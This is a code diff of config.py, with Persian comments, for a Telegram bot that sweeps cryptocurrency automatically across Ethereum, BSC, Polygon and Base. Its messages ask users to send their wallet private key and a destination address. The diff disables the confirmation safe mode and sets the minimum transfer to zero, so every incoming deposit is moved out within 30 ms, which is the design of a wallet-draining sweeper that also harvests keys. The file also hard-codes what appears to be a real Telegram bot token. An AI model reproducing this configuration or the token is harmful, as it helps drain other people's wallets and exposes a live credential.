@@ -1,80 +1,61 @@
-# config.py - تنظیمات کامل ربات انتقال خودکار ارزهای دیجیتال
+# config.py - تنظیمات نهایی ربات انتقال خودکار
 
-# ==================== تنظیمات اصلی ====================
+# تنظیمات تلگرام (حتماً توکن ربات را بررسی کنید)
 TELEGRAM_BOT_TOKEN = "7678697695:AAGAu62W-RwXgTt7igKQWy-Yxl4NM5O9JIo"
+TELEGRAM_ADMINS = [123456789]  # عددی UserID شما در تلگرام (از @userinfobot بگیرید)
 
-# ==================== تنظیمات شبکه‌ها ====================
+# تنظیمات شبکه‌ها با RPCهای پرسرعت
 NETWORKS = {
     'ethereum': {
-        'rpc': 'https://rpc.ankr.com/eth',  # بهترین RPC عمومی اتریوم
+        'rpc': 'https://eth.llamarpc.com',
         'scan': 'https://etherscan.io/tx/',
         'chain_id': 1,
-        'symbol': 'ETH'
+        'native_token': 'ETH'
     },
     'bsc': {
-        'rpc': 'https://bsc-dataseed1.defibit.io/',  # جایگزین سریع برای BSC
+        'rpc': 'https://bsc-dataseed1.defibit.io',
         'scan': 'https://bscscan.com/tx/',
         'chain_id': 56,
-        'symbol': 'BNB'
+        'native_token': 'BNB'
     },
     'polygon': {
-        'rpc': 'https://polygon-rpc.com/',  # RPC رسمی پالیگان
+        'rpc': 'https://polygon-bor.publicnode.com',
         'scan': 'https://polygonscan.com/tx/',
         'chain_id': 137,
-        'symbol': 'MATIC'
+        'native_token': 'MATIC'
     },
     'base': {
-        'rpc': 'https://mainnet.base.org',  # RPC اصلی Base
+        'rpc': 'https://base.publicnode.com',
         'scan': 'https://basescan.org/tx/',
         'chain_id': 8453,
-        'symbol': 'ETH'
+        'native_token': 'ETH'
     }
 }
 
-# ==================== تنظیمات فنی ====================
-CHECK_INTERVAL = 0.03  # فاصله چک کردن تراکنش‌ها (بر حسب ثانیه - 30ms)
-GAS_LIMIT = 21000      # حد استاندارد گس برای انتقال ساده
-MAX_RETRIES = 3        # تعداد دفعات تلاش برای انتقال در صورت خطا
-RETRY_DELAY = 5        # تاخیر بین تلاش‌های مجدد (ثانیه)
+# تنظیمات فنی
+CHECK_INTERVAL = 0.03  # 30 میلی‌ثانیه
+GAS_LIMIT = 21000
+MAX_RETRIES = 5  # تعداد دفعات تلاش مجدد
+RETRY_DELAY = 2  # ثانیه
 
-# ==================== تنظیمات امنیتی ====================
-SAFE_MODE = True       # اگر True باشد، قبل از انتقال تأیید می‌گیرد
-MINIMUM_TRANSFER = {   # حداقل مقدار انتقال برای هر شبکه (به اتر)
-    'ethereum': 0.001,
-    'bsc': 0.001,
-    'polygon': 0.1,
-    'base': 0.001
-}
+# تنظیمات انتقال (همانطور که خواستید)
+MINIMUM_TRANSFER = 0  # حداقل انتقال = 0 (حتی مقادیر بسیار کم)
+SAFE_MODE = False  # تأییدیه نمی‌خواهد
 
-# ==================== پیام‌های قابل تنظیم ====================
+# تنظیمات پیام‌ها
 MESSAGES = {
-    'start': "🤖 ربات انتقال خودکار ارزهای دیجیتال فعال شد!\nلطفا کلید خصوصی کیف پول خود را ارسال کنید:",
-    'invalid_key': "⚠️ کلید خصوصی نامعتبر است! باید با 0x شروع شود و 66 کاراکتر داشته باشد.",
-    'ask_destination': "✅ کلید خصوصی دریافت شد.\nلطفا آدرس کیف پول مقصد را ارسال کنید:",
-    'invalid_address': "⚠️ آدرس کیف پول نامعتبر است! لطفا آدرس صحیح را وارد کنید.",
-    'start_monitoring': "🔄 مانیتورینگ شروع شد! هر واریزی به کیف پول‌های زیر به صورت خودکار انتقال داده می‌شود:\n"
-                      "- Ethereum (ETH)\n"
-                      "- Binance Smart Chain (BNB)\n"
-                      "- Polygon (MATIC)\n"
-                      "- Base (ETH)"
+    'start': "🤖 به ربات انتقال فوری خوش آمدید!\n🔐 لطفا کلید خصوصی کیف پول را ارسال کنید:",
+    'invalid_pk': "❌ کلید خصوصی نامعتبر! فرمت صحیح: 66 کاراکتر با 0x شروع شود",
+    'ask_destination': "📭 لطفا آدرس مقصد را ارسال کنید:",
+    'invalid_address': "❌ آدرس نامعتبر! لطفا آدرس صحیح بلاکچین را وارد کنید",
+    'start_monitoring': "✅ مانیتورینگ آغاز شد!\n\n🔹 شبکه‌های تحت نظر:\n- Ethereum\n- BSC\n- Polygon\n- Base\n\nهر موجودی وارد شده به کیف پول شما فوراً انتقال داده می‌شود.",
+    'transfer_alert': "⚠️ انتقال انجام شد!\n▸ شبکه: {network}\n▸ مقدار: {amount} {symbol}\n▸ کارمزد: {fee} {symbol}\n▸ Tx: {tx_url}"
 }
 
-# ==================== RPCهای جایگزین (برای مواقع قطعی) ====================
+# RPCهای جایگزین
 BACKUP_RPCS = {
-    'ethereum': [
-        'https://cloudflare-eth.com',
-        'https://eth.llamarpc.com'
-    ],
-    'bsc': [
-        'https://bsc-dataseed.binance.org/',
-        'https://bsc-dataseed1.ninicoin.io/'
-    ],
-    'polygon': [
-        'https://polygon-bor.publicnode.com',
-        'https://polygon-rpc.com'
-    ],
-    'base': [
-        'https://base.publicnode.com',
-        'https://developer-access-mainnet.base.org'
-    ]
+    'ethereum': ['https://rpc.ankr.com/eth', 'https://cloudflare-eth.com'],
+    'bsc': ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed2.ninicoin.io'],
+    'polygon': ['https://polygon-rpc.com', 'https://rpc-mainnet.matic.quiknode.pro'],
+    'base': ['https://mainnet.base.org', 'https://developer-access-mainnet.base.org']
 }
